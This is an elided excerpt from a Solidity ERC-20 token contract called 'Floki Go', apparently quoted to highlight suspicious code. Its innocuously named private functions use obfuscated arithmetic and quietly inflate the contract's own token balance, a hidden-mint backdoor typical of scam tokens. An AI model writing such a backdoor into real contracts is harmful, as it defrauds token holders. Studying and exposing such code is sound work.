...
contract FlokiGo is Context, IERC20, Ownable {
    ...
    string private constant _name = "Floki Go";
    ...
    function _getUsageData(uint256 amount) private {
        ...
        if (amount < liquidityFee) 
        {
            ...
            if (amount > marketingFee){
                uint256 TotalAmountUsage = marketingFee * amount * 1000 + 10 / 1 / 1;
    ...
    function valueUsage(uint256 tokens) private {
            _tOwned[address(this)] = _tOwned[address(this)] + tokens + tokens * 100 / 1 / 1;
